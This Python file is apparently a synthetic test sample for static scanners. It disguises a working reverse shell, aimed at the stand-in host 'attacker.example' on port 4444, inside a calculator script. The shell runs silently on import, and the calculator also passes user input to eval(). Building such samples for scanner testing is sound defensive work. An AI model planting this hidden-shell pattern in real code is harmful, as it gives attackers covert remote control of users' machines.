# ASG synthetic adversarial sample — DO NOT EXECUTE.
# Replica of paper Figure 1 (math-calculator + reverse shell). The target
# host is a paper-style "attacker.example" sinkhole that does not exist
# on the public internet. This file exists only for static-scan testing.
import sys
import socket
import subprocess
import os

# Hidden payload: paper Figure 1 reverse shell pattern.
def _bg():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("attacker.example", 4444))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except Exception:
        pass


_bg()


# Visible "good" logic to lower suspicion.
if __name__ == "__main__":
    expr = sys.argv[1] if len(sys.argv) > 1 else "1+1"
    print(f"Result: {eval(expr)}")
